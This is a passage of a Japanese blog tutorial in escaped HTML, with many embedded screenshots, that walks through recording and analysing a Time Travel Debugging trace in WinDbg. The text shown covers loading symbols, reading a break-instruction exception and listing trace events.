    style=&quot;padding-bottom: 54.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABb0lEQVQoz6WSu0/DMBDG+//viAmJgY0ZgcTAipAYoeHROLZju3k/G9om6sc5oSWIQpEYfrqzcz5/98WTIs+R76Eoij8zPjOxSVVVKMvyx8JDjOsnNuGcw/M8aKWgPjDGIIoihGF4EFtvaweFWYaHxyk8LhAFEeI4gdFzpEmGtu2wWq2/0a5bdF2Hjr5vNhsEQQApZT/lJEkSusEQczBP0gdDN9XUMEfyQZqWyLKBPC8RBikJMBByDi4Cmk59bSilJhRmM7eHk1opJJSv4Ps+XVCiaRrU9QLL5Rvu7qc4OrnA2fkNjk+vcHl9SxbpYeQ4ick7A+ZyPDkvcF2PmnrwGO9hrqA9iozijPV7dj11XnsYqRNCjxXGpMLQokFV1igLy4Ko+tG3e9ZTrTX5a3qfE0IrTXlK5zU1FUPDNE1JEQMn/wSXNO4Qx7mNg3KXIttZY2Gk2HGePxXaue1fUqMnsw+r7jessN3Dtp3/y/ZhvwPQ6DVs85U7BgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/19c7d77f0173fa84d4f0a31389cda00b/8ac56/image-30.webp 240w,
/static/19c7d77f0173fa84d4f0a31389cda00b/d3be9/image-30.webp 480w,
/static/19c7d77f0173fa84d4f0a31389cda00b/042cc/image-30.webp 527w&quot;
              sizes=&quot;(max-width: 527px) 100vw, 527px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/19c7d77f0173fa84d4f0a31389cda00b/8ff5a/image-30.png 240w,
/static/19c7d77f0173fa84d4f0a31389cda00b/e85cb/image-30.png 480w,
/static/19c7d77f0173fa84d4f0a31389cda00b/44385/image-30.png 527w&quot;
            sizes=&quot;(max-width: 527px) 100vw, 527px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/19c7d77f0173fa84d4f0a31389cda00b/44385/image-30.png&quot;
            alt=&quot;画像に alt 属性が指定されていません。ファイル名: image-30.png&quot;
            title=&quot;画像に alt 属性が指定されていません。ファイル名: image-30.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;アプリケーションが実行され、障害が再現されました。この時点でTTDトレースが取得されているため、[プログラムの終了]をクリックしてアプリケーションを終了します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4b165877ec22631875e1dc785be8a9b9/0b533/image-31.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACrUlEQVQ4y41SS08aURQeH6mhC3cSFxqjaSiRxFXdl/7JpsvSBbY/QJsuuqkoVoOCwMDAwAwDzDDDPEB88vh6zqXVtjHRm/lyTs6c+93vPKRvGRWO48Jsd9BqW2ibDBst00GxbkM3XXRsF07XR+D34fs9XFxcYjC4EvYPLi+v0ek4kA7SGbyNx7G5GcPW1hZisZjwo4SNSAyvIlFEIhG8jkaxvr6BePwdPW6TiACe10cQDOCTZTSbFqQf+yksLi5CkqRnIRwOQy5VUdfa0A0TDcNCl9Tz6boepGw2i+XlZZE8OzuLmZmZf8Axxvz8vMhZXV1FLneOWq2OalVFuazApDbx8fwA0unZGZaWwiKZCZ5SuLKyAlmWYRiGgKZpsDv2lNAjwnQ6fa+QVczNzQmwKrYLCy8ICwiFQvcK8/k86vU6VFVFpVJBu91+IDw8OEToZehRNW+2t3F8cor91BFy5wXs7e1hbW0NSrlM6prQdZ1Kr9F0Ow+EhUIRiUQCHxOf8HlnB8lkEjtk37//gN3dr7QSAzQtF11KZiXJ5BeUlRpqag2NRkOo7FjWw1C4qa7bxcVggH6f14DXwRcwGgYURUEuLyOTOYVclMUwstm8IOL+Valk0zSnhF0irNAFXavTGmh0uSIaLpdKUCixVCyKeKVaRbGQpxKnBBr1T9d0UmiIsm37r6GoNHqTSuFyuC9cBoN9vthsUkz4GlqtFkpyCSV6kBUyuAKO3xNWSJVldUiui17Qo40PqGwunXx/6nvUG88N6H8fFu0cD8FxHHGHbUB5o9EIJvFIrufh+uYWw+EI48kEo/FE2Kk/Jgvc3N7hbjjEWPwD6Jvit89xtj71XxrdXuPpM8Fzzs3VANL38waO9R5+asGjONZ6SKseUootcFTzROz/vJNGH6migV/NBKZqnNlXpwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4b165877ec22631875e1dc785be8a9b9/8ac56/image-31.webp 240w,
/static/4b165877ec22631875e1dc785be8a9b9/d3be9/image-31.webp 480w,
/static/4b165877ec22631875e1dc785be8a9b9/b0a15/image-31.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4b165877ec22631875e1dc785be8a9b9/8ff5a/image-31.png 240w,
/static/4b165877ec22631875e1dc785be8a9b9/e85cb/image-31.png 480w,
/static/4b165877ec22631875e1dc785be8a9b9/0b533/image-31.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4b165877ec22631875e1dc785be8a9b9/0b533/image-31.png&quot;
            alt=&quot;image-31.png&quot;
            title=&quot;image-31.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;アプリケーションが終了すると、自動的にTTDトレースが開始され、Timelinesの位置が先頭の状態で開始されます。&lt;/p&gt;
&lt;p&gt;ここから、いよいよTTDを用いたトラブルシューティングを開始します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4848fb3a587368a95aca2e693ab84c50/0b533/image-32.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 66.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACOElEQVQ4y41S2ZLaMBD0//9NKqmw+wd5ILA2vi+MMT7lQ+ZYKI7OjGDZ4i2q6tI16umekTb5Y8KOM+RFiSwvsd7kaNoOXS9p7tGI7glB+yhewwsShPQmWRVI0oLuetxuN+x2B2iOMYc+/4vpdArLMhEEPsyFAduyEEURijxHWZYQTQM5SIRBCN93sVqtCEQchaiqCjw+P0/QFgsTjuvCtGzYtkckMTzPI+IAOZG1oiW1PbquQ98P6j4MAyJLsV6vsVwuUdf1N6FHZHzIARuyW1U12lZASqlIGMMwEFmvzgJSGJKLJEnUuzAMlYMnYUQHLJ8v2CKDA1kdW+FgBq852f0+VurSNEUcx0+Fh8ORamg7yLJMBbBKzqzIHiS8LopCkeZ5QfULlGVOyrEBCeF7HuM4QvuYz2EYBhaLBXyqmwoKAqWY10pdzWVoH5YDROE9Lk1XSnH5aIoiNHQdOmE2m1NjLDiOC/1Dh2ma9Gil7AghVF25nvfS3JNxqVjpV5eVZZbMdjv6Y3JgDNhtR4XtKLGjrPv9HtvdnhRs4VITPddBTN1mdb7vq7Lcm0KEaUiZxB7uZoBH8HMJj8F7mh2ak4I/+gi5PZB9gaZhxZ2CEPwLJE6nM/0ECa2lzmXdDlElEddM2CIqByybEXHRq/WmGZS68+WKy/WGyw2voLMzLQ5H+jbAGd/jSjgSLngdV/zfuEL7Mcvw5ghMbIE3htMq8H7y2P82a/w0SvwivNnNI0a84J3O3q0K/wBQasHtOBOkhwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/4848fb3a587368a95aca2e693ab84c50/8ac56/image-32.webp 240w,
/static/4848fb3a587368a95aca2e693ab84c50/d3be9/image-32.webp 480w,
/static/4848fb3a587368a95aca2e693ab84c50/b0a15/image-32.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/4848fb3a587368a95aca2e693ab84c50/8ff5a/image-32.png 240w,
/static/4848fb3a587368a95aca2e693ab84c50/e85cb/image-32.png 480w,
/static/4848fb3a587368a95aca2e693ab84c50/0b533/image-32.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/4848fb3a587368a95aca2e693ab84c50/0b533/image-32.png&quot;
            alt=&quot;image-32.png&quot;
            title=&quot;image-32.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このままTTD解析を行うこともできますが、せっかくなので保存されたトレースファイルを開いて解析を行いましょう。&lt;/p&gt;
&lt;p&gt;一度WinDbgを閉じたあと、再度管理者権限で起動します。&lt;/p&gt;
&lt;p&gt;先ほどと同じく[ファイル]の一覧から、今度は[Open trace file]を選択して、作成された.runファイルを開きます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e6b8480b8b5affa1bf60a2cc654a5781/0b533/image-33.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAARlAAAEZQAGA43XUAAACFklEQVQoz5WSXU/SURjA/+uGlWhs0OJtAiLGkv68hay2Xr5Fn6SWa90gMt7a3KqLtm4s1PoONu+8MDNzuSlSICAITOpKQTd+/c9xMXXddLbfnnOe7fntOec5ysM333k0t0OtecDvX20ODtq022263S7/u05OTlCuxta5/WqTfLHMXrXC7m6ZVrPF2tpXUqkUmWyWrEY6nZbns4icIJPJMDU1xdLSEoru+RfCLzfZrrZo7Nep1ev0ej1mZ2fR6XSYLTYMBgMDAwPo9XqGhoZkHBwclIizyWTi8hU9sXgC5dKzVTwvNijVmlRKRfL5bTpHh8wvLGB3ewkFAzy4f49IJEIgECAajTIxMUFEoOXC4TBer5frZrPWaRZFefqZkfQGhfIehZ9lCqUqh8c93uXm8Y6Po6q3uHsnKgtVVSUYDBIKhfrR7/fj8XgwGo3yGRTl8QouTbier7C2VWd1q0ax1eH12xxmq4WxsTGGhx1YrVbsdrvEZrP19wKXyyWvfSp8soIz/Y2dwg9ajTpVbTDH3SPmP3zkmt3JDU3oHh3F6XTKwn/hdrulUAxICl2acHUrr025SkVDDOV9bo6RmyoupwOHwyGFFxGyv/GcUHS4Xdmn2dinVjudci6Xw2KxyIJRrUPRhRBfROR9Pp98knPCsx+70+mwvLzM5OQk09PTkng8TiwW6yP+nYjJZJKZmRkSiQSfFhf5A3Qe4rocuYGSAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e6b8480b8b5affa1bf60a2cc654a5781/8ac56/image-33.webp 240w,
/static/e6b8480b8b5affa1bf60a2cc654a5781/d3be9/image-33.webp 480w,
/static/e6b8480b8b5affa1bf60a2cc654a5781/b0a15/image-33.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e6b8480b8b5affa1bf60a2cc654a5781/8ff5a/image-33.png 240w,
/static/e6b8480b8b5affa1bf60a2cc654a5781/e85cb/image-33.png 480w,
/static/e6b8480b8b5affa1bf60a2cc654a5781/0b533/image-33.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e6b8480b8b5affa1bf60a2cc654a5781/0b533/image-33.png&quot;
            alt=&quot;image-33.png&quot;
            title=&quot;image-33.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これでトレースファイルがWinDbgに読み込まれ、解析ができるようになりました。&lt;/p&gt;
&lt;h2 id=&quot;ttdでトラブルシューティングを行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd%E3%81%A7%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;ttdでトラブルシューティングを行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TTDでトラブルシューティングを行う&lt;/h2&gt;
&lt;p&gt;ここからは、取得したトレースファイルを解析して、トラブルシューティングを行います。&lt;/p&gt;
&lt;h3 id=&quot;シンボルファイルを読み込む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%B7%E3%83%B3%E3%83%9C%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%80&quot; aria-label=&quot;シンボルファイルを読み込む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;シンボルファイルを読み込む&lt;/h3&gt;
&lt;p&gt;公式チュートリアルでは、まず初めにシンボルファイルのパスをWinDbgに読み込ませていきます。&lt;/p&gt;
&lt;p&gt;僕の環境では、デスクトップに&lt;code class=&quot;language-text&quot;&gt;ttd_tutorial.pdb&lt;/code&gt;を配置しているため、&lt;code class=&quot;language-text&quot;&gt;.sympath+ &amp;lt;デスクトップのパス&gt;&lt;/code&gt;としてます。
シンボルファイルのパスを追加した後は&lt;code class=&quot;language-text&quot;&gt;.reload&lt;/code&gt;コマンドを実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sympath+ C:\Users\Tadpole01\Desktop
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reload&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;シンボルファイルが適切に読み込まれている場合、以下の画像のように&lt;code class=&quot;language-text&quot;&gt;ttd_tutorial.exe&lt;/code&gt;の関数名などをWinDbgが解釈して表示することができるようになります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 539px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/250917af9537b4cef03305202ba42a47/10f9a/image-36.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 95.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAADkklEQVQ4y21UiW6jWBDk//9mZ7UrRUqU7EwOx45PfHCDAZvDJxhiJz5qq18mGa1mkdpgHl3dXV3dWrEtkOc5Xl9fsVgsUNU15LpcLjifz/8x4JddLuffzsW0IAgwGAwwm81QlqUCXi6XWK3WqKoKu93up5XIsp2yPN/xvFTvfp3vlL9mTCZoNBrwPA+O42A4HKLf76HT6cK2HQS+rwLGcYjmc4nv3wvc3BTo9XcMnMAwLFiWzYTm2Gw20EajER4fHzEhcPulRYcfeHl5wdNTg8B9BXZ3e8eADlrNCn98K9EgcK+3IJBBnzZ9DSRJgu12C63b6eD6+hq6rjODZ0a/wf39PW5vb9Fut+nYw9XVFZ1NOtf46++SAUvEUYRnft/hN1JdURRYr9fQTMNAs9mCZVrMps/nJrrdHp3aDDKEPtTx8PBAJ5cAJb79ucVAL+C5FoP1VSJRFCuw1WoFbUiH+/sf5GLMMh/I5xMza+GJd5PcRMxEeE3SObN8Z3l71PUec3Lmeb7iPZyGqik1FaLN4nf4/js5OJP4EwGAeHYkySf8fh1/2v+dfVya6wRM3cAiL5Cma4JL5zyMJ56SjpThs9MbEj4e5ex+zgoyeH5BiVWYzxOl3/1+/wF4PB75ImE5Q2bnYzYPWU4AP3AwnXpwXVt1eLnKGHRDHW6RL0pqUZqwUkMh+vsQPgHlJ0sPaLUyGJMNLPuV3B3ITcUm7RBGFcKwhmkeGOxAWg6s5IDT6cAM95CEPi+ZLgW4XKwx1C2MxjZ21TskWM5sWi2dTbAp4C05XvFespotMytRkAIpVZrxCfYFKCMkIo2ikLNc4eNdgdFIV/qT7h0O+y+T8RQT3uRMnr+a8vb2hjSZMcMBSRcAi9nMyJ/P8eqydFtJynYsxZnYar1gs2iceclyzZE7nc60E7QwzChkH1G8IlgK18l5jzAeh7QYjpvwjJMR1yy5oh4rSqomUM3O18ywYlN2ao7VLAsvvpcRJKAUBDBBEMxZ/pLdTTBlQNcVFUjWc0ooZdYJfWYIpjE1GyNjpwVMjZ7nuhyzZ2qxwwaMuRC6HKcBN42pOJR3ui4j1lN8yvsh/wsNos8so5xY+leGfc7j3d0//MBU2+WRW2Yw0NVzh4tDloNsH5lvnZtHZtwwTcgenU6najTTNFU8qlmWJshWkWi2bXPwdbXfXNeh9kzVFFltnuup/67rKUcRtJgCY6mfC/ZfFrVyHSA5Wl0AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/250917af9537b4cef03305202ba42a47/8ac56/image-36.webp 240w,
/static/250917af9537b4cef03305202ba42a47/d3be9/image-36.webp 480w,
/static/250917af9537b4cef03305202ba42a47/9cb26/image-36.webp 539w&quot;
              sizes=&quot;(max-width: 539px) 100vw, 539px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/250917af9537b4cef03305202ba42a47/8ff5a/image-36.png 240w,
/static/250917af9537b4cef03305202ba42a47/e85cb/image-36.png 480w,
/static/250917af9537b4cef03305202ba42a47/10f9a/image-36.png 539w&quot;
            sizes=&quot;(max-width: 539px) 100vw, 539px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/250917af9537b4cef03305202ba42a47/10f9a/image-36.png&quot;
            alt=&quot;image-36.png&quot;
            title=&quot;image-36.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;シンボルファイルの読み込みまで完了したら、いよいよ解析を始めていきます。&lt;/p&gt;
&lt;h3 id=&quot;トレースファイルから例外を確認する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%8B%E3%82%89%E4%BE%8B%E5%A4%96%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot; aria-label=&quot;トレースファイルから例外を確認する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;トレースファイルから例外を確認する&lt;/h3&gt;
&lt;p&gt;トレースファイルを開くと、次のように&lt;code class=&quot;language-text&quot;&gt;code 80000003&lt;/code&gt;例外が発生したことがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;19e0&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1f9c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;token keyword&quot;&gt;Break&lt;/span&gt; instruction exception &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; code 80000003 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;first/second chance not available&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
Time Travel Position: D:0 &lt;span class=&quot;token namespace&quot;&gt;[Unindexed]&lt;/span&gt; Index
&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;index
Indexed 2/2 keyframes
Successfully created the index in 362ms&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、ここに表示されている&lt;code class=&quot;language-text&quot;&gt;Time Travel Position&lt;/code&gt;は、TTDトレースの位置を表しています。（ポジションの情報は、実行環境によって変わる場合があります。）&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;!ttdexe.tt &amp;lt;Time Travel Position&gt;&lt;/code&gt;のようなコマンドを実行することで、任意のトレースポイントにジャンプすることもできます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/time-travel-debugging-extension-tt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;タイムトラベルデバッグ拡張機能! tt コマンド - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;0:000&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;ttdext&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;tt D:0
Setting position: D:0
&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;19e0&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1f9c&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;token keyword&quot;&gt;Break&lt;/span&gt; instruction exception &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; code 80000003 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;first/second chance not available&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
Time Travel Position: D:0
ntdll!LdrInitializeThunk:
00007ffd`f1944b00 4053            push    rbx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;ttdトレース内のイベント一覧を確認する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#ttd%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B9%E5%86%85%E3%81%AE%E3%82%A4%E3%83%99%E3%83%B3%E3%83%88%E4%B8%80%E8%A6%A7%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%99%E3%82%8B&quot; aria-label=&quot;ttdトレース内のイベント一覧を確認する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;TTDトレース内のイベント一覧を確認する&lt;/h3&gt;
&lt;p&gt;続いて、&lt;code class=&quot;language-text&quot;&gt;dx -r1 @$curprocess.TTD.Events&lt;/code&gt;を呼び出して、TTDトレースの中で発生したイベントの一覧を取得します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://docs.microsoft.com/ja-jp/windows-hardware/drivers/debugger/time-travel-debugging-event-objects&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;TTD イベントオブジェクト - Windows drivers | Microsoft Docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;以下の出力を見ると、プログラムの実行時に各種モジュールがロードされた後にスレッドが立ち上がり、例外が発生したためスレッドを停止して、各モジュールをアンロードしてプロセス終了した一連の流れを確認できました。&lt;/p&gt;
